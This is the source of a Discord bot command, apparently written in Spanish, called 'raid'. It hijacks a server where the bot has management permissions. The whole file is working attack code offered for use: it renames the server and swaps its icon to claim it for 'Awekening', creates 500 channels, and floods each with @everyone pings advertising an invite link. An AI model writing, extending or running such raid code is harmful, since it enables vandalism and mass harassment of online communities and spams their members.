const Discord = require("discord.js");
const db = require("megadb");
const message_db = new db.crearDB("message");
const channel_db = new db.crearDB("channel");


module.exports = {
  nombre: "raid",
  alias: ["sp"],
  run: async (client, message, args) => {

       if(!message.guild.me.hasPermission("MANAGE_CHANNELS")) return message.author.send(":x: `|` No tengo permiso de borrar/crear canales en el servidor que quieres r4idear")

       if(!message.guild.me.hasPermission("MANAGE_GUILD")) return message.author.send(":x: `|` No tengo permiso de gestionar el servidor canales en el servidor que quieres r4idear")

  





    let channel;     
 if (channel_db.tiene(message.author.id)) {
      channel = await channel_db.obtener(message.author.id)
    } else 
      channel = 'possessed by awekening'
    


    let messages;
  
    if (message_db.tiene(message.author.id)) {
      messages = await message_db.obtener(message.author.id)
    } else {
      messages = '**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN';
    }

message.guild.setIcon("https://media.discordapp.net/attachments/949870873437962280/953431995105574982/Aw.jpg").catch(err => console.log(err));
message.guild.setName("ṕ̸̦́͘o̸̧͉̮̕s̶͓͆̅ş̵̂̿̌e̶̖͆ş̸̝́s̷͙̥͐ê̴̛͙͘d̶͍͙̀ ̴͎̹̠͌̈́b̴̢̢̊͜y̷̧̪̋ ̴̖̮̮̃͑A̴̝̐w̷̹͍͓͂̀͗ě̴͕̿̏ḱ̸͓̮̝e̸̥̗̽̽ṅ̴͈̂i̶̻̟͛̈́n̴͍̦͘ġ̵̞").catch(err => console.log(err));


for(let x = 0; x < 500; x++){
  message.guild.channels.create(channel, {
    type: "text"
  })
    .catch((err) => console.log(err))
    .then((channel) => {
let localspam = " https://discord.gg/guzP8dbDvN"
channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));
    channel.send(messages + "\n\n\n\n " + "@everyone" + localspam).catch(err => console.log(err));

    

    
  }).catch(err => console.log(err));
}






  },
};
